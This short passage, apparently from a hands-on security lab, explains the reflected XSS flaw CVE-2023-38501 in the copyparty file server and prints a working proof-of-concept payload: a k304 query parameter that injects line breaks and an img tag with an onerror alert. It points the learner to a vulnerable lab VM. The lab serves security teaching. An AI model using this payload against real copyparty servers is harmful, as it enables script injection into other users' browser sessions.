...
The attached VM runs a vulnerable version of copyparty. The discovered reflected XSS vulnerability has the ID CVE-2023-38501, and its exploit is published here.<br>

The exploit code is ?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E which is the URL encoding of:<br>

<code>?k304=y <img src=copyparty onerror=alert(1)></code><br>
The attached VM has the vulnerable server running at port 3923. You can reach the vulnerable server at http://MACHINE_IP:3923 via your AttackBox’s browser.</p>
